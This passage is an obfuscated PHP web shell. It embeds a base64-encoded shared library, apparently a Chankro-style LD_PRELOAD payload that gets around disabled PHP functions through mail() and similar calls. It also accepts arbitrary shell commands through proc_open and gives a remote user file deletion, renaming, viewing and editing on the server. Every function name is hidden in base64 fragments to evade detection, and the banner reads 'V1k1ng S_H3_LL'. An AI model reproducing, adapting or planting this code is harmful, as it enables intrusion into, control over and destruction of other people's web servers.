lBQkloY0IwNlZWSWllWC8wRjNwUVAvLy8xVklpZVZJalQxNkFBQUE2RkQrLy8rKy93RUFBRWlKeCtpVC92Ly9TSTA5WVFBQUFPZzMvdi8vU0luSDZFLysvLytRWGNOVlNJbmx2Z0VBQUFDL0FRQUFBT2haL3YvLzZKVCsvLytGd0hRS3Z3QUFBQURvZHY3Ly81QmR3MVZJaWVWSWpUMGxBQUFBNkZQKy8vL28vdjMvLytnWi92Ly9rRjNEQUFCSWcrd0lTSVBFQ01ORFNFRk9TMUpQQUV4RVgxQlNSVXhQUVVRQUFSc0RPelFBQUFBRkFBQUF1UDMvLzFBQUFBQlkvdi8vZUFBQUFHai8vLytRQUFBQW5QLy8vN0FBQUFERi8vLy8wQUFBQUFBQUFBQVVBQUFBQUFBQUFBRjZVZ0FCZUJBQkd3d0hDSkFCQUFBa0FBQUFIQUFBQUdEOS8vK2dBQUFBQUE0UVJnNFlTZzhMZHdpQUFEOGFPeW96SkNJQUFBQUFGQUFBQUVRQUFBRFkvZi8vQ0FBQUFBQUFBQUFBQUFBQUhBQUFBRndBQUFEUS92Ly9OQUFBQUFCQkRoQ0dBa01OQm04TUJ3Z0FBQUFjQUFBQWZBQUFBT1QrLy84cEFBQUFBRUVPRUlZQ1F3MEdaQXdIQ0FBQUFCd0FBQUNjQUFBQTdmNy8veDBBQUFBQVFRNFFoZ0pERFFaWURBY0lBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQXNBZ0FBQUFBQUFBQUFBQUFBQUFBQUhBSUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQUFBTHNBQUFBQUFBQUFEQUFBQUFBQUFBQVlCd0FBQUFBQUFBMEFBQUFBQUFBQVhBa0FBQUFBQUFBWkFBQUFBQUFBQVBnTklBQUFBQUFBR3dBQUFBQUFBQUFRQUFBQUFBQUFBQm9BQUFBQUFBQUFDQTRnQUFBQUFBQWNBQUFBQUFBQUFBZ0FBQUFBQUFBQTlmNy9id0FBQUFEd0FRQUFBQUFBQUFVQUFBQUFBQUFBTUFRQUFBQUFBQUFHQUFBQUFBQUFBRGdDQUFBQUFBQUFDZ0FBQUFBQUFBRHBBQUFBQUFBQUFBc0FBQUFBQUFBQUdBQUFBQUFBQUFBREFBQUFBQUFBQUFBUUlBQUFBQUFBQWdBQUFBQUFBQURZQUFBQUFBQUFBQlFBQUFBQUFBQUFCd0FBQUFBQUFBQVhBQUFBQUFBQUFFQUdBQUFBQUFBQUJ3QUFBQUFBQUFCb0JRQUFBQUFBQUFnQUFBQUFBQUFBMkFBQUFBQUFBQUFKQUFBQUFBQUFBQmdBQUFBQUFBQUEvdi8vYndBQUFBQklCUUFBQUFBQUFQLy8vMjhBQUFBQUFRQUFBQUFBQUFEdy8vOXZBQUFBQUJvRkFBQUFBQUFBK2YvL2J3QUFBQUFEQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJnT0lBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRVlIQUFBQUFBQUFWZ2NBQUFBQUFBQm1Cd0FBQUFBQUFIWUhBQUFBQUFBQWhnY0FBQUFBQUFDV0J3QUFBQUFBQUtZSEFBQUFBQUFBdGdjQUFBQUFBQURHQndBQUFBQUFBR0FRSUFBQUFBQUFSME5ET2lBb1JHVmlhV0Z1SURZdU15NHdMVEU0SzJSbFlqbDFNU2tnTmk0ekxqQWdNakF4TnpBMU1UWUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFNQUFRRElBUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU1BQWdEd0FRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTUFBd0E0QWdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFNQUJBQXdCQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU1BQlFBYUJRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTUFCZ0JJQlFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFNQUJ3Qm9CUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU1BQ0FCQUJnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTUFDUUFZQndBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFNQUNnQXdCd0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU1BQ3dEUUJ3QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTUFEQURnQndBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFNQURRQmNDUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU1BRGdCbENRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTUFEd0I0Q1FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFNQUVBQ3dDUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU1BRVFENERTQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTUFFZ0FJRGlBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFNQUV3QVFEaUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU1BRkFBWURpQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTUFGUURZRHlBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFNQUZnQUFFQ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU1BRndCZ0VDQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTUFHQUJvRUNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFNQUdRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFRQUFBQVFBOGY4QUFBQUFBQUFBQUFBQUFBQUFBQUFBREFBQUFBRUFFd0FRRGlBQUFBQUFBQUFBQUFBQUFBQUFHUUFBQUFJQURBRGdCd0FBQUFBQUFBQUFBQUFBQUFBQUd3QUFBQUlBREFBZ0NBQUFBQUFBQUFBQUFBQUFBQUFBTGdBQUFBSUFEQUJ3Q0FBQUFBQUFBQUFBQUFBQUFBQUFSQUFBQUFFQUdBQm9FQ0FBQUFBQUFBRUFBQUFBQUFBQVV3QUFBQUVBRWdBSURpQUFBQUFBQUFBQUFBQUFBQUFBZWdBQUFBSUFEQUN3Q0FBQUFBQUFBQUFBQUFBQUFBQUFoZ0FBQUFFQUVRRDREU0FBQUFBQUFBQUFBQUFBQUFBQXBRQUFBQVFBOGY4QUFBQUFBQUFBQUFBQUFBQUFBQUFBQVFBQUFBUUE4ZjhBQUFBQUFBQUFBQUFBQUFBQUFBQUFyQUFBQUFFQUVBQm9DZ0FBQUFBQUFBQUFBQUFBQUFBQXVnQUFBQUVBRXdBUURpQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBUUE4ZjhBQUFBQUFBQUFBQUFBQUFBQUFBQUF4Z0FBQUFFQUZ3QmdFQ0FBQUFBQUFBQUFBQUFBQUFBQTB3QUFBQUVBRkFBWURpQUFBQUFBQUFBQUFBQUFBQUFBM0FBQUFBQUFEd0I0Q1FBQUFBQUFBQUFBQUFBQUFBQUE3d0FBQUFFQUZ3Qm9FQ0FBQUFBQUFBQUFBQUFBQUFBQSt3QUFBQUVBRmdBQUVDQUFBQUFBQUFBQUFBQUFBQUFBRVFFQUFCSUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFKUUVBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVFRRUFBQkFBRndCb0VDQUFBQUFBQUFBQUFBQUFBQUFBU0FFQUFCSUFEQUFVQ1FBQUFBQUFBQ2tBQUFBQUFBQUFVZ0VBQUJJQURRQmNDUUFBQUFBQUFBQUFBQUFBQUFBQVdBRUFBQklBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBYkFFQUFCSUFEQURnQ0FBQUFBQUFBRFFBQUFBQUFBQUFjQUVBQUJJQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWhBRUFBQ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBa3dFQUFCSUFEQUE5Q1FBQUFBQUFBQjBBQUFBQUFBQUFuUUVBQUJBQUdBQndFQ0FBQUFBQUFBQUFBQUFBQUFBQW9nRUFBQkFBR0FCb0VDQUFBQUFBQUFBQUFBQUFBQUFBcmdFQUFCSUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF3UUVBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQTFRRUFBQklBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBNndFQUFCSUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEvUUVBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUZ3SUFBQ0lBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTXdJQUFCSUFDUUFZQndBQUFBQUFBQUFBQUFBQUFBQUFPUUlBQUJJQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFHTnlkSE4wZFdabUxtTUFYMTlLUTFKZlRFbFRWRjlmQUdSbGNtVm5hWE4wWlhKZmRHMWZZMnh2Ym1WekFGOWZaRzlmWjJ4dlltRnNYMlIwYjNKelgyRjFlQUJqYjIxd2JHVjBaV1F1TmprM01nQmZYMlJ2WDJkc2IySmhiRjlrZEc5eWMxOWhkWGhmWm1sdWFWOWhjbkpoZVY5bGJuUnllUUJtY21GdFpWOWtkVzF0ZVFCZlgyWnlZVzFsWDJSMWJXMTVYMmx1YVhSZllYSnlZWGxmWlc1MGNua0FhRzl2YXk1akFGOWZSbEpCVFVWZlJVNUVYMThBWDE5S1ExSmZSVTVFWDE4QVgxOWtjMjlmYUdGdVpHeGxBRjlFV1U1QlRVbERBRjlmUjA1VlgwVklYMFpTUVUxRlgwaEVVZ0JmWDFSTlExOUZUa1JmWHdCZlIweFBRa0ZNWDA5R1JsTkZWRjlVUVVKTVJWOEFaMlYwWlc1MlFFQkhURWxDUTE4eUxqSXVOUUJmU1ZSTlgyUmxjbVZuYVhOMFpYSlVUVU5zYjI1bFZHRmliR1VBWDJWa1lYUmhBR1JoWlcxdmJtbDZaUUJmWm1sdWFRQnplWE4wWlcxQVFFZE1TVUpEWHpJdU1pNDFBSEIzYmdCemFXZHVZV3hBUUVkTVNVSkRYekl1TWk0MUFGOWZaMjF2Ymw5emRHRnlkRjlmQUhCeVpXeHZZV1J0WlFCZlpXNWtBRjlmWW5OelgzTjBZWEowQUdOb2JXOWtRRUJIVEVsQ1ExOHlMakl1TlFCZlNuWmZVbVZuYVhOMFpYSkRiR0Z6YzJWekFIVnVjMlYwWlc1MlFFQkhURWxDUTE4eUxqSXVOUUJsZUdsMFFFQkhURWxDUTE4eUxqSXVOUUJmU1ZSTlgzSmxaMmx6ZEdWeVZFMURiRzl1WlZSaFlteGxBRjlmWTNoaFgyWnBibUZzYVhwbFFFQkhURWxDUTE4eUxqSXVOUUJmYVc1cGRBQm1iM0pyUUVCSFRFbENRMTh5TGpJdU5RQUFMbk41YlhSaFlnQXVjM1J5ZEdGaUFDNXphSE4wY25SaFlnQXVibTkwWlM1bmJuVXVZblZwYkdRdGFXUUFMbWR1ZFM1b1lYTm9BQzVrZVc1emVXMEFMbVI1Ym5OMGNnQXVaMjUxTG5abGNuTnBiMjRBTG1kdWRTNTJaWEp6YVc5dVgzSUFMbkpsYkdFdVpIbHVBQzV5Wld4aExuQnNkQUF1YVc1cGRBQXVjR3gwTG1kdmRBQXVkR1Y0ZEFBdVptbHVhUUF1Y205a1lYUmhBQzVsYUY5bWNtRnRaVjlvWkhJQUxtVm9YMlp5WVcxbEFDNXBibWwwWDJGeWNtRjVBQzVtYVc1cFgyRnljbUY1QUM1cVkzSUFMbVI1Ym1GdGFXTUFMbWR2ZEM1d2JIUUFMbVJoZEdFQUxtSnpjd0F1WTI5dGJXVnVkQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQnNBQUFBSEFBQUFBZ0FBQUFBQUFBRElBUUFBQUFBQUFNZ0JBQUFBQUFBQUpBQUFBQUFBQUFBQUFBQUFBQUFBQUFRQUFBQUFBQUFBQUFBQUFBQUFBQUF1QUFBQTl2Ly9id0lBQUFBQUFBQUE4QUVBQUFBQUFBRHdBUUFBQUFBQUFFUUFBQUFBQUFBQUF3QUFBQUFBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUFBT0FBQUFBc0FBQUFDQUFBQUFBQUFBRGdDQUFBQUFBQUFPQUlBQUFBQUFBRDRBUUFBQUFBQUFBUUFBQUFCQUFBQUNBQUFBQUFBQUFBWUFBQUFBQUFBQUVBQUFBQURBQUFBQWdBQUFBQUFBQUF3QkFBQUFBQUFBREFFQUFBQUFBQUE2UUFBQUFBQUFBQUFBQUFBQUFBQUFBRUFBQUFBQUFBQUFBQUFBQUFBQUFCSUFBQUEvLy8vYndJQUFBQUFBQUFBR2dVQUFBQUFBQUFhQlFBQUFBQUFBQ29BQUFBQUFBQUFBd0FBQUFBQUFBQUNBQUFBQUFBQUFBSUFBQUFBQUFBQVZRQUFBUDcvLzI4Q0FBQUFBQUFBQUVnRkFBQUFBQUFBU0FVQUFBQUFBQUFnQUFBQUFBQUFBQVFBQUFBQkFBQUFDQUFBQUFBQUFBQUFBQUFBQUFBQUFHUUFBQUFFQUFBQUFnQUFBQUFBQUFCb0JRQUFBQUFBQUdnRkFBQUFBQUFBMkFBQUFBQUFBQUFEQUFBQUFBQUFBQWdBQUFBQUFBQUFHQUFBQUFBQUFBQnVBQUFBQkFBQUFFSUFBQUFBQUFBQVFBWUFBQUFBQUFCQUJnQUFBQUFBQU5nQUFBQUFBQUFBQXdBQUFCWUFBQUFJQUFBQUFBQUFBQmdBQUFBQUFBQUFlQUFBQUFFQUFBQUdBQUFBQUFBQUFCZ0hBQUFBQUFBQUdBY0FBQUFBQUFBWEFBQUFBQUFBQUFBQUFBQUFBQUFBQkFBQUFBQUFBQUFBQUFBQUFBQUFBSE1BQUFBQkFBQUFCZ0FBQUFBQUFBQXdCd0FBQUFBQUFEQUhBQUFBQUFBQW9BQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFBRUFBQUFBQUFBQUIrQUFBQUFRQUFBQVlBQUFBQUFBQUEwQWNBQUFBQUFBRFFCd0FBQUFBQUFBZ0FBQUFBQUFBQUFBQUFBQUFBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUFBaHdBQUFBRUFBQUFHQUFBQUFBQUFBT0FIQUFBQUFBQUE0QWNBQUFBQUFBQjZBUUFBQUFBQUFBQUFBQUFBQUFBQUVBQUFBQUFBQUFBQUFBQUFBQUFBQUkwQUFBQUJBQUFBQmdBQUFBQUFBQUJjQ1FBQUFBQUFBRndKQUFBQUFBQUFDUUFBQUFBQUFBQUFBQUFBQUFBQUFBUUFBQUFBQUFBQUFBQUFBQUFBQUFDVEFBQUFBUUFBQUFJQUFBQUFBQUFBWlFrQUFBQUFBQUJsQ1FBQUFBQUFBQk1BQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFBQUFBQUFBQUFBQW13QUFBQUVBQUFBQ0FBQUFBQUFBQUhnSkFBQUFBQUFBZUFrQUFBQUFBQUEwQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUFLa0FBQUFCQUFBQUFnQUFBQUFBQUFDd0NRQUFBQUFBQUxBSkFBQUFBQUFBdkFBQUFBQUFBQUFBQUFBQUFBQUFBQWdBQUFBQUFBQUFBQUFBQUFBQUFBQ3pBQUFBRGdBQUFBTUFBQUFBQUFBQStBMGdBQUFBQUFENERRQUFBQUFBQUJBQUFBQUFBQUFBQUFBQUFBQUFBQUFJQUFBQUFBQUFBQWdBQUFBQUFBQUF2d0FBQUE4QUFBQURBQUFBQUFBQUFBZ09JQUFBQUFBQUNBNEFBQUFBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUFBQ0FBQUFBQUFBQUFJQUFBQUFBQUFBTXNBQUFBQkFBQUFBd0FBQUFBQUFBQVFEaUFBQUFBQUFCQU9BQUFBQUFBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQUFnQUFBQUFBQUFBQUFBQUFBQUFBQURRQUFBQUJnQUFBQU1BQUFBQUFBQUFHQTRnQUFBQUFBQVlEZ0FBQUFBQUFNQUJBQUFBQUFBQUJBQUFBQUFBQUFBSUFBQUFBQUFBQUJBQUFBQUFBQUFBZ2dBQUFBRUFBQUFEQUFBQUFBQUFBTmdQSUFBQUFBQUEyQThBQUFBQUFBQW9BQUFBQUFBQUFBQUFBQUFBQUFBQUNBQUFBQUFBQUFBSUFBQUFBQUFBQU5rQUFBQUJBQUFBQXdBQUFBQUFBQUFBRUNBQUFBQUFBQUFRQUFBQUFBQUFZQUFBQUFBQUFBQUFBQUFBQUFBQUFBZ0FBQUFBQUFBQUNBQUFBQUFBQUFEaUFBQUFBUUFBQUFNQUFBQUFBQUFBWUJBZ0FBQUFBQUJnRUFBQUFBQUFBQWdBQUFBQUFBQUFBQUFBQUFBQUFBQUlBQUFBQUFBQUFBQUFBQUFBQUFBQTZBQUFBQWdBQUFBREFBQUFBQUFBQUdnUUlBQUFBQUFBYUJBQUFBQUFBQUFJQUFBQUFBQUFBQUFBQUFBQUFBQUFBUUFBQUFBQUFBQUFBQUFBQUFBQUFPMEFBQUFCQUFBQU1BQUFBQUFBQUFBQUFBQUFBQUFBQUdnUUFBQUFBQUFBTFFBQUFBQUFBQUFBQUFBQUFBQUFBQUVBQUFBQUFBQUFBUUFBQUFBQUFBQUJBQUFBQWdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDWUVBQUFBQUFBQUJnR0FBQUFBQUFBR3dBQUFDMEFBQUFJQUFBQUFBQUFBQmdBQUFBQUFBQUFDUUFBQUFNQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQXNCWUFBQUFBQUFCTEFnQUFBQUFBQUFBQUFBQUFBQUFBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQkVBQUFBREFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFQc1lBQUFBQUFBQTlnQUFBQUFBQUFBQUFBQUFBQUFBQUFFQUFBQUFBQUFBQUFBQUFBQUFBQUE9');
                $jhb_45 = $_POST[base64_decode('Y21kX2lucHV0')];
                $pob_46 = $ogq_3b($jhb_45 . base64_decode('ID4gdGVzdC50eHQ='));
                $yxm_2e = base64_decode('PGhyPjxwPlJlc3VsdDogPGZvbnQgY29sb3I9ImJsYWNrIj5iYXNlNjQgOiA=') . $pob_46 . base64_decode('PC9icj5QbGVhc2UgUmVmcmVzaCBhbmQgQ2hlY2sgRmlsZSB0ZXN0LnR4dCwgdGhpcyBvdXRwdXQgY29tbWFuZDxicj50ZXN0LnR4dCBjcmVhdGVkID0gVlVMTjxicj50ZXN0LnR4dCBub3QgY3JlYXRlZCA9IE5PVCBWVUxOPGJyPmV4YW1wbGUgYWNjZXNzOiBkb21haW4uY29tL3lvdXJwYXRoL3BhdGgvdGVzdC50eHQ8YnI+VjFrMW5nIFNfSDNfTEw8L2ZvbnQ+PGJyPjxicj48L3RleHRhcmVhPg==');
                $niy_38($muk_43 . base64_decode('L2NoYW5rcm8uc28='), $jtt_3a($xsu_44));
                $niy_38($muk_43 . base64_decode('L2FjcGlkLnNvY2tldA=='), $jtt_3a($pob_46));
                $ydk_37(base64_decode('Q0hBTktSTz0=') . $muk_43 . base64_decode('L2FjcGlkLnNvY2tldA=='));
                $ydk_37(base64_decode('TERfUFJFTE9BRD0=') . $muk_43 . base64_decode('L2NoYW5rcm8uc28='));
                if (function_exists(base64_decode('bWFpbA=='))) {
                    $ols_39(base64_decode('YQ=='), base64_decode('YQ=='), base64_decode('YQ=='), base64_decode('YQ=='));
                } elseif (function_exists(base64_decode('bWJfc2VuZF9tYWls'))) {
                    $kuk_3c(base64_decode('YQ=='), base64_decode('YQ=='), base64_decode('YQ=='), base64_decode('YQ=='));
                } elseif (function_exists(base64_decode('ZXJyb3JfbG9n'))) {
                    $rof_3d(base64_decode('YQ=='), 1, base64_decode('YQ=='));
                } elseif (function_exists(base64_decode('aW1hcF9tYWls'))) {
                    $jhk_3f(base64_decode('YQ=='), base64_decode('YQ=='), base64_decode('YQ=='));
                }
            } elseif (isset($_POST[base64_decode('ZGVsZXRlX2ZpbGU=')])) {
                $edy_47 = $ula_2d . base64_decode('Lw==') . $_POST[base64_decode('ZGVsZXRlX2ZpbGU=')];
                if (file_exists($edy_47)) {
                    if (is_dir($edy_47)) {
                        if (nxy_6($edy_47)) {
                            echo base64_decode('PGhyPkZvbGRlciBkZWxldGVkIHN1Y2Nlc3NmdWxseSE=');
                        } else {
                            echo base64_decode('PGhyPkVycm9yOiBGYWlsZWQgdG8gZGVsZXRlIGZvbGRlciE=');
                        }
                    } else {
                        if ($ltw_e($edy_47)) {
                            echo base64_decode('PGhyPkZpbGUgZGVsZXRlZCBzdWNjZXNzZnVsbHkh');
                        } else {
                            echo base64_decode('PGhyPkVycm9yOiBGYWlsZWQgdG8gZGVsZXRlIGZpbGUh');
                        }
                    }
                } else {
                    echo base64_decode('PGhyPkVycm9yOiBGaWxlIG9yIGRpcmVjdG9yeSBub3QgZm91bmQh');
                }
            } elseif (isset($_POST[base64_decode('cmVuYW1lX2l0ZW0=')]) && isset($_POST[base64_decode('b2xkX25hbWU=')]) && isset($_POST[base64_decode('bmV3X25hbWU=')])) {
                $rqg_48 = $ula_2d . base64_decode('Lw==') . $_POST[base64_decode('b2xkX25hbWU=')];
                $qal_49 = $ula_2d . base64_decode('Lw==') . $_POST[base64_decode('bmV3X25hbWU=')];
                if (file_exists($rqg_48)) {
                    if (rename($rqg_48, $qal_49)) {
                        echo base64_decode('PGhyPkl0ZW0gcmVuYW1lZCBzdWNjZXNzZnVsbHkh');
                    } else {
                        echo base64_decode('PGhyPkVycm9yOiBGYWlsZWQgdG8gcmVuYW1lIGl0ZW0h');
                    }
                } else {
                    echo base64_decode('PGhyPkVycm9yOiBJdGVtIG5vdCBmb3VuZCE=');
                }
            } elseif (isset($_POST[base64_decode('Y21kX2JpYXNh')])) {
                $lwx_4a = base64_decode('cA==') . base64_decode('cg==') . base64_decode('bw==') . base64_decode('Yw==') . base64_decode('Xw==') . base64_decode('bw==') . base64_decode('cA==') . base64_decode('ZQ==') . base64_decode('bg==');
                $fwg_4b = base64_decode('Zg==') . base64_decode('Yw==') . base64_decode('bA==') . base64_decode('bw==') . base64_decode('cw==') . base64_decode('ZQ==');
                $zbe_4c = base64_decode('cA==') . base64_decode('cg==') . base64_decode('bw==') . base64_decode('Yw==') . base64_decode('Xw==') . base64_decode('Yw==') . base64_decode('bA==') . base64_decode('bw==') . base64_decode('cw==') . base64_decode('ZQ==');
                $xxc_4d = base64_decode('cw==') . base64_decode('dA==') . base64_decode('cg==') . base64_decode('ZQ==') . base64_decode('YQ==') . base64_decode('bQ==') . base64_decode('Xw==') . base64_decode('Zw==') . base64_decode('ZQ==') . base64_decode('dA==') . base64_decode('Xw==') . base64_decode('Yw==') . base64_decode('bw==') . base64_decode('bg==') . base64_decode('dA==') . base64_decode('ZQ==') . base64_decode('bg==') . base64_decode('dA==') . base64_decode('cw==');
                $pzy_4e = $_POST[base64_decode('Y21kX2JpYXNh')];
                $akz_4f = (strtoupper(substr(PHP_OS, 0, 3)) === base64_decode('V0lO'));
                if ($akz_4f) {
                    $csd_50 = escapeshellarg($pzy_4e);
                    $mgq_51 = base64_decode('Y21kLmV4ZSAvYyA=') . $csd_50;
                } else {
                    $mgq_51 = $pzy_4e;
                }
                $qbw_52 = array(0 => array(base64_decode('cGlwZQ=='), base64_decode('cg==')), 1 => array(base64_decode('cGlwZQ=='), base64_decode('dw==')), 2 => array(base64_decode('cGlwZQ=='), base64_decode('dw==')));
                $euj_53 = $lwx_4a($mgq_51, $qbw_52, $fcq_54);
                if (is_resource($euj_53)) {
                    $bhg_55 = $xxc_4d($fcq_54[1]);
                    $bgl_56 = $xxc_4d($fcq_54[2]);
                    $fwg_4b($fcq_54[1]);
                    $fwg_4b($fcq_54[2]);
                    $zbe_4c($euj_53);
                    if (!empty($bgl_56)) {
                        $yxm_2e = base64_decode('PGhyPjxwPkVycm9yOiA8L3A+PHRleHRhcmVhIGNsYXNzPSJyZXN1bHQtYm94Ij4=') . $ans_1b($bgl_56) . base64_decode('PC90ZXh0YXJlYT4=');
                    } else {
                        $yxm_2e = base64_decode('PGhyPjxwPlJlc3VsdDogPC9wPjx0ZXh0YXJlYSBjbGFzcz0icmVzdWx0LWJveCI+') . $ans_1b($bhg_55) . base64_decode('PC90ZXh0YXJlYT4=');
                    }
                } else {
                    $yxm_2e = base64_decode('UmVzdWx0OjwvcD48dGV4dGFyZWEgY2xhc3M9InJlc3VsdC1ib3giPkVycm9yOiBGYWlsZWQgdG8gZXhlY3V0ZSBjb21tYW5kISA8L3RleHRhcmVhPg==');
                }
            } elseif (isset($_POST[base64_decode('dmlld19maWxl')])) {
                $cpb_35 = $ula_2d . base64_decode('Lw==') . $_POST[base64_decode('dmlld19maWxl')];
                if (file_exists($cpb_35)) {
                    $rxr_36 = $day_1e($cpb_35);
                    $yxm_2e = base64_decode('PGhyPjxwPlJlc3VsdDog') . $_POST[base64_decode('dmlld19maWxl')] . base64_decode('PC9wPg0KICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ij8=') . (isset($_SERVER[base64_decode('UVVFUllfU1RSSU5H')]) ? $_SERVER[base64_decode('UVVFUllfU1RSSU5H')] : '') . base64_decode('Ij4NCiAgICAgICAgICAgIDx0ZXh0YXJlYSBuYW1lPSJjb250ZW50IiBjbGFzcz0icmVzdWx0LWJveCI+') . $ans_1b($rxr_36) . base64_decode('PC90ZXh0YXJlYT48dGQ+DQogICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJlZGl0X2ZpbGUiIHZhbHVlPSI=') . $_POST[base64_decode('dmlld19maWxl')] . 